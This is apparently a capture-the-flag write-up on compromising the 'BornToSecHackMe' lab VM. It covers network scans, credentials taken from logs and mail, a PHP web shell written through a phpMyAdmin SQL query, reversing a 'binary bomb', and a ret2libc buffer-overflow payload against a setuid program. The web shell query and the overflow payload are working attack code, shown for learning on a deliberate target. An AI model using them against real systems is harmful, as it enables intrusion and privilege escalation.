# Writeup 1

First step is to get the ip of the vm.

```
nmap 192.168.1.0-255

Nmap scan report for borntosechackme.home (192.168.1.37)
Host is up (0.00049s latency).
Not shown: 994 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
```

A web page is available at this address.

In order to learn more about other paths we use dirb.

```
cd Applications/dirb222

dirb https://192.168.1.37 wordlists/common.txt

DIRB v2.22    
By The Dark Raver


START_TIME: Thu Apr 29 13:14:57 2021
URL_BASE: https://192.168.1.37/
WORDLIST_FILES: wordlists/common.txt

GENERATED WORDS: 4612                                                          

---- Scanning URL: https://192.168.1.37/ ----
+ https://192.168.1.37/cgi-bin/ (CODE:403|SIZE:289)                                                                             
==> DIRECTORY: https://192.168.1.37/forum/                                                                                      
==> DIRECTORY: https://192.168.1.37/phpmyadmin/                                                                                 
+ https://192.168.1.37/server-status (CODE:403|SIZE:294)                                                                        
==> DIRECTORY: https://192.168.1.37/webmail/ 
```

After searching through the results, a page in particular caught our attention :

forum/index.php -> Probleme login ?
```
https://192.168.1.37/forum/index.php?mode=thread&id=6
```

We notice this :

Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2

A user called lmezard tried to use his password as his username to login.

Using those credentials, we log in the forum as lmezard.


Checking user information, we have an email address : laurie@borntosec.net

Let's use it to connect to https://192.168.1.37/webmail/.

We get the password in a mail allowing us to access the database at https://192.168.1.37/phpmyadmin/

```
root
Fg-'kKXBj87E:aJ$
```

From there we can execute SQL requests.
By reading this tutorial : https://github.com/ilosuna/mylittleforum, we understand there is a file which we can use to execute cli commands.
Let's run this request : 

```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/backdoor.php";
```

Running a test : https://192.168.1.37/forum/templates_c/backdoor.php?cmd=pwd

We can see that pwd was executed and we can see the current path.

Let's list the files : 
```
https://192.168.1.37/forum/templates_c/backdoor.php?cmd=ls%20 /home

LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz
```

Let's display LOOKATME : 
```
https://192.168.1.37/forum/templates_c/backdoor.php?cmd=cat%20 /home/LOOKATME/password

lmezard:G!@M6f4Eatau{sF"
```

It doesn't work with ssh but works with ftp.

```
ftp lmezard@192.168.1.37
Connected to 192.168.1.37.
220 Welcome on this server
331 Please specify the password.
Password:
230 Login successful.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
ftp>
```

Download the files.

```
get README
get fun

cat README
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```

Upon inspecting the file fun, we notice calls to getme() function.

The first characters are easy to get but the other ones are a bit tricky.

To simplify the search, simply search for "return " and we find every character that we need and then sort them by the order each function is called.

After searching, we get the string Iheartpwnage and we use sha256 on it, giving us : 

```
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

We can now connect with ssh on the vm as user laurie.

```
ssh laurie@192.168.1.37
laurie@BornToSecHackMe:~$ ls
bomb  README

laurie@BornToSecHackMe:~$ cat README
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```

The binary bomb is a series of steps to complete.

Let's use ghidra to do some reverse engineering and understand each step.

Phase 1 :

```
void phase_1(char *param_1)

{
  int iVar1;
  
  iVar1 = strings_not_equal(param_1,"Public speaking is very easy.");
  if (iVar1 != 0) {
    explode_bomb();
  }
  return;
}
```

Solution :

Program simply compares the input and expects this string in order to continue :
```
Public speaking is very easy.
```

Phase 2 :
```
void read_six_numbers(char *param_1,int param_2)
{
  int iVar1;
  
  iVar1 = sscanf(param_1,"%d %d %d %d %d %d",param_2,param_2 + 4,param_2 + 8,param_2 + 0xc,
                 param_2 + 0x10,param_2 + 0x14);
  if (iVar1 < 6) {
    explode_bomb();
  }
  return;
}

void phase_2(char *param_1)
{
  int iVar1;
  int aiStack32 [7];
  
  read_six_numbers(param_1,(int)(aiStack32 + 1));
  if (aiStack32[1] != 1) {
    explode_bomb();
  }
  iVar1 = 1;
  do {
    if (aiStack32[iVar1 + 1] != (iVar1 + 1) * aiStack32[iVar1]) {
      explode_bomb();
    }
    iVar1 = iVar1 + 1;
  } while (iVar1 < 6);
  return;
}
```
Solution :

We need to provide the correct values as input in order to proceed.
After checking what the values need to be, we get the result.

```
1 2 6 24 120 720
```


Phase3 :

```
void phase_3(char *param_1)
{
  int iVar1;
  char cVar2;
  uint local_10;
  char local_9;
  int local_8;
  
  iVar1 = sscanf(param_1,"%d %c %d",&local_10,&local_9,&local_8);
  if (iVar1 < 3) {
    explode_bomb();
  }
  switch(local_10) {
  case 0:
    cVar2 = 'q';
    if (local_8 != 0x309) {
      explode_bomb();
    }
    break;
  case 1:
    cVar2 = 'b';
    if (local_8 != 0xd6) {
      explode_bomb();
    }
    break;
  case 2:
    cVar2 = 'b';
    if (local_8 != 0x2f3) {
      explode_bomb();
    }
    break;
  case 3:
    cVar2 = 'k';
    if (local_8 != 0xfb) {
      explode_bomb();
    }
    break;
  case 4:
    cVar2 = 'o';
    if (local_8 != 0xa0) {
      explode_bomb();
    }
    break;
  case 5:
    cVar2 = 't';
    if (local_8 != 0x1ca) {
      explode_bomb();
    }
    break;
  case 6:
    cVar2 = 'v';
    if (local_8 != 0x30c) {
      explode_bomb();
    }
    break;
  case 7:
    cVar2 = 'b';
    if (local_8 != 0x20c) {
      explode_bomb();
    }
    break;
  default:
    cVar2 = 'x';
    explode_bomb();
  }
  if (cVar2 != local_9) {
    explode_bomb();
  }
  return;
}
```

case = first parameter
second parameter = cVar2
third parameter = value compared in hex.
There are 7 solutions in total but we later realised that we need to use a specific one :

Solution :
```
1 b 214
```

Phase 4 :

```
int func4(int param_1)
{
  int iVar1;
  int iVar2;
  
  if (param_1 < 2) {
    iVar2 = 1;
  }
  else {
    iVar1 = func4(param_1 + -1);
    iVar2 = func4(param_1 + -2);
    iVar2 = iVar2 + iVar1;
  }
  return iVar2;
}

void phase_4(char *param_1)

{
  int iVar1;
  int local_8;
  
  iVar1 = sscanf(param_1,"%d",&local_8);
  if ((iVar1 != 1) || (local_8 < 1)) {
    explode_bomb();
  }
  iVar1 = func4(local_8);
  if (iVar1 != 0x37) {
    explode_bomb();
  }
  return;
}
```
The bomb explodes if sscanf doesn't return 1 or if local_8 contains 0.
The bomb explodes if iVar1 is not 55 (0x37 = 55), func4() is called in a recursive way and modifies the value of iVar1 and iVar2 depending on the provided parameter. 
After testing and rebuilding the function, the correct computed value to reach 55 is to provide 9 as an argument.

Solution :

```
9
```


Phase 5:

```
undefined4 strings_not_equal(char *param_1,char *param_2)
{
  char cVar1;
  int iVar2;
  int iVar3;
  undefined4 uVar4;
  
  iVar2 = string_length(param_1);
  iVar3 = string_length(param_2);
  if (iVar2 == iVar3) {
    cVar1 = *param_1;
    while (cVar1 != '\0') {
      if (*param_1 != *param_2) goto LAB_08049057;
      param_1 = param_1 + 1;
      param_2 = param_2 + 1;
      cVar1 = *param_1;
    }
    uVar4 = 0;
  }
  else {
LAB_08049057:
    uVar4 = 1;
  }
  return uVar4;
}

int string_length(char *param_1)
{
  char cVar1;
  int iVar2;
  
  iVar2 = 0;
  cVar1 = *param_1;
  while (cVar1 != '\0') {
    param_1 = param_1 + 1;
    iVar2 = iVar2 + 1;
    cVar1 = *param_1;
  }
  return iVar2;
}

void phase_5(char *param_1)
{
  int iVar1;
  char local_c [6];
  undefined local_6;
  
  iVar1 = string_length(param_1);
  if (iVar1 != 6) {
    explode_bomb();
  }
  iVar1 = 0;
  do {
    local_c[iVar1] = (&array.123)[(char)(param_1[iVar1] & 0xf)];
    iVar1 = iVar1 + 1;
  } while (iVar1 < 6);
  local_6 = 0;
  iVar1 = strings_not_equal(local_c,"giants");
  if (iVar1 != 0) {
    explode_bomb();
  }
  return;
}
```

Solution :

The program compares 2 strings and if the first one is not equal to "giants", the bomb explodes.
We built a javascript program in order to solve it.

```

<script>
  const arrayString = "isrveawhobpnutfg";
  const alphabet = "abcdefghijklmnopqrstuvwxyz";
  const test = () => {
    let sum = [];
    const findWord = "giants";
    for (let i = 0; i < 6; i++) {
      for (let j = 0; j < alphabet.length; j++) {
        if (arrayString[alphabet[j].charCodeAt(0) & 0xf] === findWord[i]) {
          sum.push(alphabet[j]);
          break;
        }
      }
    }
    console.log(sum);
  };
  test();
</script>
```

```
Result : opekma
```


Phase 6 :

```
void read_six_numbers(char *param_1,int param_2)
{
  int iVar1;
  
  iVar1 = sscanf(param_1,"%d %d %d %d %d %d",param_2,param_2 + 4,param_2 + 8,param_2 + 0xc,
                 param_2 + 0x10,param_2 + 0x14);
  if (iVar1 < 6) {
    explode_bomb();
  }
  return;
}

void phase_6(char *param_1)
{
  int *piVar1;
  int iVar2;
  int *piVar3;
  int iVar4;
  undefined1 *local_38;
  int *local_34 [6];
  int local_1c [6];
  
  local_38 = node1;
  read_six_numbers(param_1,(int)local_1c);
  iVar4 = 0;
  do {
    if (5 < local_1c[iVar4] - 1U) {
      explode_bomb();
    }
    iVar2 = iVar4 + 1;
    if (iVar2 < 6) {
      do {
        if (local_1c[iVar4] == local_1c[iVar2]) {
          explode_bomb();
        }
        iVar2 = iVar2 + 1;
      } while (iVar2 < 6);
    }
    iVar4 = iVar4 + 1;
  } while (iVar4 < 6);
  iVar4 = 0;
  do {
    iVar2 = 1;
    piVar3 = (int *)local_38;
    if (1 < local_1c[iVar4]) {
      do {
        piVar3 = (int *)piVar3[2];
        iVar2 = iVar2 + 1;
      } while (iVar2 < local_1c[iVar4]);
    }
    local_34[iVar4] = piVar3;
    iVar4 = iVar4 + 1;
  } while (iVar4 < 6);
  iVar4 = 1;
  piVar3 = local_34[0];
  do {
    piVar1 = local_34[iVar4];
    piVar3[2] = (int)piVar1;
    iVar4 = iVar4 + 1;
    piVar3 = piVar1;
  } while (iVar4 < 6);
  piVar1[2] = 0;
  iVar4 = 0;
  do {
    if (*local_34[0] < *(int *)local_34[0][2]) {
      explode_bomb();
    }
    local_34[0] = (int *)local_34[0][2];
    iVar4 = iVar4 + 1;
  } while (iVar4 < 5);
  return;
}
```

Solution :

The goal is to provide each node as an argument and to sort them by their value in descending order (highest value to lowest value).

```
4 2 6 3 1 5
```

Bomb is defused and the password for the user thor is all of the combined answers as a string which gives us :

```
ssh thor@192.168.1.37
thor@192.168.1.37's password: Publicspeakingisveryeasy.126241207201b2149opekmq426135
thor@BornToSecHackMe:~$
```

```
thor@BornToSecHackMe:~$ ls
README  turtle
thor@BornToSecHackMe:~$ cat README
Finish this challenge and use the result as password for 'zaz' user.
```

The turtle file refers to https://docs.python.org/fr/3/library/turtle.html.
The file contains instructions in order to draw a word. Let's use the python library to solve it and also indicates we need to use md5 on the result.

The result is

```
SLASH

md5(SLASH) -> 646da671ca01bb5d84dbb5fb2238dc8e
```

Authenticate as zaz :

```
thor@BornToSecHackMe:~$ su zaz
Password: 646da671ca01bb5d84dbb5fb2238dc8e
zaz@BornToSecHackMe:~$ ls
exploit_me  mail
```



Upon disassembling the binary exploit_me, there is a call to strcpy().
The program segfaults if we provide more than 140 characters to print.

```
zaz@BornToSecHackMe:~$ ./exploit_me `python -c "print 'A' * 141"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

Let's use a ret2libc in order to get root access.

1) Get system address 

./exploit_me `python -c "print 'A' * 140 + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7'"`





